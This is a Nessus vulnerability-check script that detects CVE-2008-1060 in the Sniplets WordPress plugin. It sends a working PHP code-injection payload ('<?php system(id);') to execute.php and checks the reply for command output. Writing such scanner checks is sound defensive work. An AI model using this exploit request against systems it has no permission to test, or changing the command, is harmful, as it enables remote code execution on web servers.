#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31167);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-1060");
  script_bugtraq_id(27985);
  script_xref(name:"milw0rm", value:"5194");
  script_xref(name:"OSVDB", value:"42260");
  script_xref(name:"Secunia", value:"29099");

  script_name(english:"Sniplets Plugin for WordPress execute.php text Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using Sniplets plugin");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sniplets, a third-party text insertion
plugin for WordPress. 

The version of Sniplets installed on the remote host passes user input
to the 'text' parameter of the 'modules/execute.php' script before
passing it to an 'eval()' statement.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated remote
attacker can leverage this issue to execute arbitrary code on the
remote host subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/488734" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to run a command.
  cmd = "id";
  exploit = string("<?php system(", cmd, ");");

  req = http_get(
    item:string(
      dir, "/wp-content/plugins/sniplets/modules/execute.php?",
      "text=", urlencode(str:exploit)
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # the output looks like it's from id or...
    egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
    # PHP's disable_functions prevents running system().
    egrep(pattern:"Warning.+ has been disabled for security reasons", string:res)
  )
  {
    if (
      report_verbosity &&
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)
    )
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote\n",
        "host to produce the following results :\n",
        "\n",
        "  ", egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
  }
}
